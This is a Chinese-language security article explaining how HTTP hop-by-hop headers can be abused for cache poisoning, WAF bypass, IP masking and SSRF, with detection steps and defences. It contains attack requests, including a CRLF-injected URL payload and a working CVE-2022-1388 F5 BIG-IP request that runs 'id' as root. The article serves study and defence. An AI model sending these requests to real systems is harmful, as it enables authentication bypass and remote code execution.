
---

# **滥用 Hop-by-Hop Headers 的技术解析与防御**

HTTP 协议中的 **Hop-by-Hop Headers** 是仅在当前节点之间有效的头部，不会被转发到下一个节点。Nathan Davison 的研究表明，通过错误配置或协议实现中的漏洞，攻击者可以利用 Hop-by-Hop Headers 来删除关键头部、破坏协议一致性，从而触发缓存投毒 (Cache Poisoning)、WAF 绕过、IP 隐藏以及服务器端请求伪造 (SSRF) 等攻击。

**Hop-by-Hop Headers 备忘表**

| **代理服务器** | **是否消费 `Connection` 中声明的头部** | **备注**                                                             |
| :------------- | :------------------------------------- | :------------------------------------------------------------------- |
| Apache         | 是                                     | 会严格遵守 HTTP/1.1 规范，消费 `Connection` 中声明的字段并删除它们。 |
| Nginx          | 否                                     | 默认不会消费 `Connection` 声明的头部，需要通过额外配置处理。         |
| OpenResty      | 否                                     | 基于 Nginx，相同默认行为。需要明确设置以消费声明的头部。             |
| HAProxy        | 否                                     | 不会默认消费 `Connection` 中声明的字段，直接转发到下游。             |

---

## **1. Hop-by-Hop Headers 的基础**

### **定义：**
根据 HTTP/1.1 规范（RFC 2616），以下头部被默认视为 Hop-by-Hop Headers：
- **Keep-Alive**
- **Transfer-Encoding**
- **TE**
- **Connection**
- **Trailer**
- **Upgrade**
- **Proxy-Authorization**
- **Proxy-Authenticate**

这些头部仅在当前节点间有效，代理服务器在转发请求时应删除这些头部。

### **自定义 Hop-by-Hop Headers：**
用户可以通过 `Connection` 头部声明额外的 Hop-by-Hop Headers。例如：
```http
Connection: close, X-Foo, X-Bar
```
上述请求表示：
- `X-Foo` 和 `X-Bar` 被声明为 Hop-by-Hop Headers。
- 代理服务器在转发请求时应删除 `X-Foo` 和 `X-Bar`。

---

## **2. Hop-by-Hop Headers 滥用的潜在问题**

### **删除关键头部导致逻辑异常**

一些代理服务器会插入关键头部（如 `X-Forwarded-For` 或 `X-Real-IP`）来传递用户的真实信息。如果攻击者通过 `Connection` 声明这些头部为 Hop-by-Hop Headers，这些头部可能会被代理错误删除，从而导致后端行为异常。

#### **示例：**
- **场景**：后端服务器依赖 `X-Forwarded-For` 来识别请求来源 IP。
- **攻击请求**：
  ```http
  GET /admin HTTP/1.1
  Host: example.com
  Connection: X-Forwarded-For
  X-Forwarded-For: 203.0.113.123
  ```
- **后果**：代理删除了 `X-Forwarded-For`，后端认为请求来自代理出口 IP（如 `127.0.0.1`），可能误认为是可信请求。

---

### **代理服务器对 Hop-by-Hop Headers 的处理错误**

代理服务器在处理 `Connection` 头部及其声明的 Hop-by-Hop Headers 时，可能出现以下两类违规行为：
1. **未消费（consume）`Connection` 头部**：直接将用户请求中的 `Connection` 头部及其值转发给下游服务器。
2. **合并用户声明的 Hop-by-Hop Headers 与代理自己的头部**：将用户的 `Connection` 值与代理声明的 Hop-by-Hop Headers 合并后转发。

这些错误操作可能导致下游服务器收到不应转发的头部或逻辑错误，从而引发安全问题。

---

#### **错误行为 1：未消费 `Connection` 头部**

一些代理未正确消费 `Connection` 头部及其声明的字段，而是将其完整地转发至下游服务器。

- **示例：**
  ```http
  原始请求：
  GET /api/resource HTTP/1.1
  Host: example.com
  Connection: close, X-Custom-Header
  X-Custom-Header: sensitive-value
  ```

  - **代理行为：** 未删除 `Connection` 头部及其声明的字段，直接转发：
    ```http
    转发请求：
    GET /api/resource HTTP/1.1
    Host: example.com
    Connection: close, X-Custom-Header
    X-Custom-Header: sensitive-value
    ```

  - **后果：**
    - 下游服务器可能错误地删除 `X-Custom-Header`，导致逻辑或安全问题。
    - 下游服务器可能对 `Connection` 头部中的值做出错误的逻辑判断。

---

#### **错误行为 2：合并用户声明和代理声明的头部**

一些代理会错误地将用户请求中的 `Connection` 值与自己的 Hop-by-Hop Headers 合并，生成一个新的 `Connection` 头部，然后转发到下游服务器。

- **示例：**
  ```http
  原始请求：
  GET /api/resource HTTP/1.1
  Host: example.com
  Connection: close, X-Custom-Header
  X-Custom-Header: sensitive-value
  ```

  - **代理行为：** 生成新的 `Connection` 头部并转发：
    ```http
    转发请求：
    GET /api/resource HTTP/1.1
    Host: example.com
    Connection: close, X-Custom-Header, Proxy-Keep-Alive
    X-Custom-Header: sensitive-value
    Proxy-Keep-Alive: true
    ```

  - **后果：**
    - 下游服务器接收到不必要的头部（如 `Proxy-Keep-Alive`），可能导致逻辑异常。
    - 敏感信息（如 `X-Custom-Header`）被泄露给下游服务器。

---


![]()
---


## **3. 如何检测系统是否受影响**

**测试系统是否存在 Hop-by-Hop Headers 的问题** 可以通过以下方法验证：

### **选择会显著影响响应的头部**
例如选择 `Cookie`，因为带有或不带有 `Cookie` 的请求往往会导致明显不同的响应内容。

#### **测试流程：**

1. **正常访问**：
   - 使用认证后的 `Cookie` 发送请求：
     ```http
     GET /api/me HTTP/1.1
     Host: foo.bar
     Cookie: session=admin
     Connection: close
     ```
     - **预期响应**：`HTTP 200`，表示用户已认证。

2. **未认证访问**：
   - 不带 `Cookie` 发送请求：
     ```http
     GET /api/me HTTP/1.1
     Host: foo.bar
     Connection: close
     ```
     - **预期响应**：`HTTP 302`，表示用户未认证。

3. **模拟 Hop-by-Hop Headers 删除**：
   - 将 `Cookie` 声明为 Hop-by-Hop Headers：
     ```http
     GET /api/me HTTP/1.1
     Host: foo.bar
     Cookie: session=admin
     Connection: close, Cookie
     ```
     - **结果验证**：
       - 如果代理删除了 `Cookie`，响应应与未认证访问相同（`HTTP 302`）。
       - 如果响应与携带 `Cookie` 的请求一致，则说明系统未受影响。

### **自动化测试：**
使用工具如 **Burp Suite** 的 **Intruder** 功能，配合头部字典批量测试，验证系统对各种头部的处理行为是否符合预期。

---

## **4. 利用 Hop-by-Hop Headers 的五种攻击技术**

结合上述理论，Nathan Davison 提出了五种典型的攻击技术：

1. **Cache Poisoning via Hop-by-Hop Header Abuse**  
   - 删除 `Cookie` 头部，导致缓存未登录用户的响应。
   - **防御措施**：细化缓存策略，确保用户状态相关内容不被缓存。

2. **WAF Rule Bypass via Hop-by-Hop Headers**  
   - 声明 `X-API-Key` 为 Hop-by-Hop Headers，绕过 WAF 检测。
   - **防御措施**：WAF 优先处理并移除 Hop-by-Hop Headers。

3. **Exploiting Pipe Mode in Varnish**  
   - 利用 WebSocket 配置转发恶意头部，影响后端逻辑。
   - **防御措施**：限制 `pipe` 模式中的用户定义头部。

4. **Masking the Originating IP Address by Hiding X-Forwarded-For**  
   - 删除 `X-Forwarded-For`，隐藏攻击者真实 IP。
   - **防御措施**：使用专用头部（如 `X-Real-IP`），明确验证来源。

5. **Server-Side Requests (By Design or Forged)**  
   - 通过 SSRF 或正常功能删除头部，访问内部资源。
   - **防御措施**：限制服务器端请求目标范围，验证外部输入。

### **4.1 Cache Poisoning via Hop-by-Hop Header Abuse**

#### **场景**

- 某个静态资源（如 `/static-content`）由缓存服务器缓存。
- 缓存服务器使用 `User-Agent` 请求头作为缓存键的一部分。
- 应用程序要求 `User-Agent` 请求头必须存在，否则返回非预期内容（如调试信息或错误页面）。
- 攻击者利用代理服务器对 `Connection` 头部的错误处理，删除了 `User-Agent` 请求头，导致缓存服务器缓存了错误的响应。

---

#### **攻击流程：**

1. **构造恶意请求：**
   攻击者向目标服务器发送以下请求：
   ```http
   GET /static-content HTTP/1.1
   Host: example.com
   Connection: close, User-Agent
   User-Agent: Malicious-Bot
   ```

   - **`Connection: close, User-Agent`**：指示代理服务器将 `User-Agent` 头部声明为 Hop-by-Hop Headers。
   - **`User-Agent: Malicious-Bot`**：攻击者伪造的 User-Agent 值。

2. **代理服务器错误处理：**
   - 代理服务器错误地删除了 User-Agent 头部，导致后端应用检测不到该头部并返回错误响应。此时，无论 Connection 头部是否被移除，缓存服务器可能会错误地缓存该响应，从而导致缓存中毒。
   - 转发到后端服务器的请求变为：
     ```http
     GET /static-content HTTP/1.1
     Host: example.com
     Connection: close
     ```

3. **后端服务器响应：**
   - 后端服务器要求 `User-Agent` 存在，但由于缺失，返回非预期的错误响应（如调试页面或默认错误信息）。

4. **缓存服务器缓存错误响应：**
   - 缓存服务器未识别错误响应的特殊性，将其缓存为 `/static-content` 的通用内容。
   - 缓存键未正确包括 `User-Agent`，导致该错误响应被错误地视为所有用户的通用响应。

5. **影响后续用户：**
   - 其他用户访问 `/static-content` 时，缓存服务器直接返回已缓存的错误响应：
     ```html
     <html>
     <body>Error: User-Agent header is required.</body>
     </html>
     ```

---

#### **后果：**

- **服务可用性受影响：**
  - 所有用户访问 `/static-content` 时均会收到错误响应，导致功能不可用。

- **扩展攻击风险：**
  - 攻击者可以构造更多类似请求，进一步污染缓存中的其他静态资源。

---

### **4.2 WAF Rule Bypass via Hop-by-Hop Headers**

#### **场景**

WAF 通常通过检查请求中的特定头部（例如 `X-API-Key`）来验证请求是否符合安全规则。如果存在错误配置或实现漏洞，攻击者可以通过声明 `X-API-Key` 为 Hop-by-Hop Headers，诱导代理服务器删除该头部，从而导致 WAF 和后端服务器之间的安全逻辑被破坏。

---

#### **攻击流程**

1. **构造恶意请求：**
   攻击者发送以下请求：
   ```http
   GET /admin HTTP/1.1
   Host: example.com
   Connection: X-API-Key
   X-API-Key: malicious-key
   ```

   - **`Connection: X-API-Key`**：指示代理服务器将 `X-API-Key` 声明为 Hop-by-Hop Headers。
   - **`X-API-Key: malicious-key`**：模拟用户的认证信息。

2. **WAF 的行为：**
   - WAF 检测到 `X-API-Key`，根据规则认为请求已认证，放行请求。

3. **代理服务器错误处理：**
   - 代理错误地删除了 `X-API-Key`，并将以下请求转发给后端：
     ```http
     GET /admin HTTP/1.1
     Host: example.com
     Connection: X-API-Key
     ```

4. **后端服务器行为：**
   - 后端服务器由于缺少 `X-API-Key` 头部，未能识别该请求为已认证状态。
   - 后端可能返回默认的公共资源、调试信息，或者因应用逻辑错误导致授权资源被误返回。

---

#### **后果**

1. **绕过 WAF 规则：**
   - WAF 检测到的头部与后端实际接收到的头部不一致。
   - 攻击者可能利用这一差异实现访问控制绕过。

2. **访问控制异常：**
   - 如果后端默认处理规则错误（例如没有认证信息时返回敏感资源），攻击者可能通过这种方式访问受保护的资源。

3. **信息泄露：**
   - 在某些场景下，后端可能返回调试信息或错误页面，暴露系统内部结构。

---

### **4.3 Exploiting Pipe Mode in Varnish**

#### **场景**
攻击者利用 Varnish 的 WebSocket 配置，将恶意头部直接转发到后端。

#### **攻击流程：**
1. **WebSocket 配置：**
   ```vcl
   sub vcl_pipe {
       if (req.http.upgrade) {
           set bereq.http.upgrade = req.http.upgrade;
           set bereq.http.connection = req.http.connection;
       }
   }
   ```

2. **构造请求：**
   ```http
   GET / HTTP/1.1
   Host: example.com
   Upgrade: websocketz
   Connection: keep-alive, xxx
   ```

3. **后端行为：**
   - 后端错误地处理 `Connection` 声明的头部，移除关键头部 `xxx`。

#### **后果：**
后端返回错误响应或触发缓存污染。

---

### **4.4 Masking the Originating IP Address by Hiding X-Forwarded-For**

#### **场景**
攻击者通过声明 `X-Forwarded-For` 为 Hop-by-Hop Headers，隐藏其真实 IP，绕过基于 IP 的访问控制。

#### **攻击流程：**
1. **构造请求：**
   ```http
   GET /admin HTTP/1.1
   Host: example.com
   X-Forwarded-For: 203.0.113.123
   Connection: X-Forwarded-For
   ```

2. **代理行为：**
   - 删除 `X-Forwarded-For`，后端无法检测攻击者真实 IP。

3. **后端行为：**
   - 后端错误地认为请求来自可信来源（如 `127.0.0.1`）。

---

### **4.5 Server-Side Requests (By Design or Forged)**


#### **场景**

在某些应用场景中，服务器端存在以下安全漏洞：
1. **SSRF（Server-Side Request Forgery）漏洞**：
   攻击者可以通过用户输入控制服务器端请求的目标 URL。
2. **CRLF（Carriage Return Line Feed）注入漏洞**：
   攻击者可以注入额外的请求头或请求体。
3. **Hop-by-Hop Headers 处理不当**：
   攻击者可以利用 `Connection` 头部操控代理服务器的行为。

通过结合这些漏洞，攻击者可以对服务器端请求实现更复杂的控制，从而访问内部资源、操控头部和请求体，甚至污染缓存。

---

#### **攻击流程**

1. **构造恶意请求：**
   攻击者通过 URL 参数注入，构造如下请求：
   ```http
   GET /fetch-data?url=http://localhost/admin%0A%0DConnection:%20close,Someheader%0A%0DSomeheader:%20xxxx HTTP/1.1
   Host: example.com
   ```

   - **`url=http://localhost/admin`**：目标是内部管理接口。
   - **`%0A%0D`（CRLF）**：注入换行符，分隔请求头。
   - **`Connection: close,Someheader`**：声明 `Someheader` 为 Hop-by-Hop Headers。
   - **`Someheader: xxxx`**：注入的自定义头部。

2. **服务器端生成的请求：**
   如果服务器端未对输入进行严格校验，生成的请求可能为：
   ```http
   GET /admin HTTP/1.1
   Host: localhost
   Connection: close,Someheader
   Someheader: xxxx
   ```

3. **代理服务器的错误行为：**
   - 代理服务器错误地删除了 `Someheader`，但未正确处理 `Connection` 头部。
   ```http
   GET /admin HTTP/1.1
   Host: localhost
   Connection: close
   ```
   - 或者代理转发了未被消费的 `Connection` 头部，导致下游服务器逻辑异常。
   ```http
   GET /admin HTTP/1.1
   Host: localhost
   Connection: close,Someheader
   ```
   - 或者代理服务器错误地删除了 `Someheader`，正确处理 `Connection` 头部,但应用只关心 `Someheader`。
   ```http
   GET /admin HTTP/1.1
   Host: localhost
   ```

4. **目标服务器的响应：**
   - 目标服务器由于缺少预期的头部或请求体，可能返回错误页面、调试信息，甚至暴露敏感数据。

---

#### **结合 Hop-by-Hop Headers 的高级攻击**

通过声明 `Connection` 头部并操控其值，攻击者可以进一步增强攻击的复杂性：
1. 删除特定请求头：通过声明为 Hop-by-Hop Headers，诱导代理服务器删除某些头部。
2. 注入新的头部：利用 CRLF 注入，操控目标服务器对请求的解析。
3. 污染缓存：结合错误的 Hop-by-Hop Headers 处理，将错误响应缓存为通用内容。

---

#### **后果**

1. **访问控制绕过：**
   - 攻击者可访问内部系统的敏感接口（如 `http://localhost/admin`）。

2. **敏感信息泄露：**
   - 目标服务器返回的调试信息或内部资源可能暴露关键数据。

3. **缓存污染：**
   - 如果目标服务器的响应被缓存，可能影响后续用户的访问。

4. **扩展攻击能力：**
   - 攻击者通过操控请求头，可能实现更复杂的攻击（如跨系统的持久化攻击）。

---

#### **真实案例: [CVE-2022-1388](https://paper.seebug.org/1908/)**

CVE-2022-1388 是 F5 BIG-IP iControl REST 组件中的一个高危漏洞，允许攻击者利用 **Hop-by-Hop Headers** 的滥用绕过安全机制，进而实现远程代码执行。该漏洞的核心是 Apache 和 Jetty 两个组件在处理认证请求时的逻辑差异，以及对 Hop-by-Hop Headers 的错误处理。

---

##### **漏洞关键点**

1. **认证处理分工：**
   - **Apache**：负责检查请求是否包含 `Authorization` 或 `X-F5-Auth-Token` 头部，判断用户是否已认证。
   - **Jetty**：在 Apache 转发请求后，进一步解析 `Authorization` 和 `X-F5-Auth-Token` 的值，设置用户身份。

2. **Apache 的行为：**
   - 如果请求头 `X-F5-Auth-Token` 存在且值为空，则返回 `401 Unauthorized`，拒绝请求。
   - 如果 `X-F5-Auth-Token` 存在且值不为空，则直接将请求转发给 Jetty。

3. **Jetty 的行为：**
   - Jetty 在接收到转发的请求后，解析 `Authorization` 或 `X-F5-Auth-Token` 的值。
   - 如果用户名匹配 `admin`，则绕过鉴权，视为已认证用户。

4. **Hop-by-Hop Headers 滥用：**
   - 攻击者利用 `Connection` 头部声明 `X-F5-Auth-Token` 为 Hop-by-Hop Header。
   - Apache 在接收请求时检测到 `X-F5-Auth-Token` 不为空，将请求转发给 Jetty，但在转发之前删除了 `X-F5-Auth-Token`。
   - Jetty 由于未能检测到 `X-F5-Auth-Token`，默认处理 `Authorization`，从而导致权限绕过。

---

##### **攻击流程**

###### **1. Apache 的认证处理**

- 当请求到达 Apache 时，Apache 会根据请求头判断认证状态：
  - 如果 `X-F5-Auth-Token` 不存在或为空，返回 `401 Unauthorized`。
  - 如果 `X-F5-Auth-Token` 存在且值不为空，将请求转发给 Jetty。

###### **2. Jetty 的认证逻辑**

- Jetty 接收请求后：
  - 如果请求中有 `Authorization`，解析用户名和密码。
  - 如果用户名为 `admin`，直接将用户标记为默认管理员，无需校验密码。

###### **3. Hop-by-Hop Headers 的利用**

- 攻击者构造特制请求，声明 `X-F5-Auth-Token` 为 Hop-by-Hop Header：
  ```http
  POST /mgmt/tm/util/bash HTTP/1.1
  Host: target-device
  Connection: X-F5-Auth-Token
  X-F5-Auth-Token: fake-token
  Authorization: Basic YWRtaW46
  Content-Type: application/json
  Content-Length: 43

  {"command":"run","utilCmdArgs":"id"}
  ```

- **关键点**：
  - **Apache 的行为：**  
    - 检测到 `X-F5-Auth-Token: fake-token`，认为认证已通过，将请求转发给 Jetty。
    - 在转发时，删除 `X-F5-Auth-Token` 头部（根据 Hop-by-Hop Headers 的定义）。
  - **Jetty 的行为：**  
    - 接收到的请求已删除 `X-F5-Auth-Token`，但仍包含 `Authorization` 头部。
    - 由于用户名为 `admin`，Jetty 将用户标记为管理员，绕过了权限校验。

###### **4. 执行命令**

- Jetty 将请求中的 `{"command":"run","utilCmdArgs":"id"}` 传递到后台执行命令。
- 攻击者成功获得目标设备的权限。

---

##### **示例攻击请求与处理过程**

###### **攻击请求：**
```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: target-device
Connection: X-F5-Auth-Token
X-F5-Auth-Token: fake-token
Authorization: Basic YWRtaW46
Content-Type: application/json
Content-Length: 43

{"command":"run","utilCmdArgs":"id"}
```

###### **Apache 接收并转发：**
- Apache 检测到 `X-F5-Auth-Token: fake-token`，认为请求已认证，将其转发给 Jetty。
- 转发时删除 `X-F5-Auth-Token`：
  ```http
  POST /mgmt/tm/util/bash HTTP/1.1
  Host: target-device
  Authorization: Basic YWRtaW46
  Content-Type: application/json
  Content-Length: 43

  {"command":"run","utilCmdArgs":"id"}
  ```

###### **Jetty 处理请求：**
- Jetty 检测到 `Authorization: Basic YWRtaW46`，解析用户名为 `admin`。
- Jetty 将用户标记为默认管理员，绕过鉴权，执行请求。

###### **执行结果：**
- Jetty 调用命令行，执行 `id` 命令。
- 返回结果：
  ```json
  {
    "kind": "tm:util:bash:runstate",
    "commandResult": "uid=0(root) gid=0(root) groups=0(root)"
  }
  ```

---

## **5. 总结**

Hop-by-Hop Headers 是 HTTP 协议中的关键机制，但如果代理和服务配置不当，可能引发严重的安全风险。攻击者可以利用这些漏洞删除关键头部或破坏协议一致性，从而影响系统行为。通过严格的规范遵循、自动化测试以及合理的系统配置，可以有效防止这些攻击。


## **6. 参考**
https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers
https://www.freebuf.com/articles/web/334945.html
https://paper.seebug.org/1908/